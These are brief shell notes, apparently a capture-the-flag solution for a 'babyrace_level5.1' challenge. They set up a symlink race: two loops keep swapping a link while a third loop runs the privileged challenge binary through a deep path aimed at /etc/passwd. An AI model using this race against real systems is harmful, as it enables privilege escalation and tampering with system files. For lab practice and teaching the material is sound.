### create a dir called 'etc' at /home/hacker
### create symlink to /etc
### create symlink to /home/hacker/etc
### change symlink as race 


### shell 1 : while /bin/true ;do  ln -sfn ~/b ~/c; done 2>/dev/null
### shell 2 : while /bin/true ;do ln -sfn ~/a ~/c; done 2>/dev/null
### shell 3 : for i in $(seq 1 2000); do nice -n 19 /challenge/babyrace_level5.1 ~/0/1/2/3/4/5/6/7/8/9/10/11/12/13/14/15/16/17/18/19/20/21/22/23/24/25/26/27/28/29/30/31/32/33/34/35/36/37/38/39/40/41/42/43/44/45/46/47/48/49/50/51/52/53/54/55/56/57/58/59/60/61/62/63/64/65/66/67/68/69/root/c/passwd ; done | tee out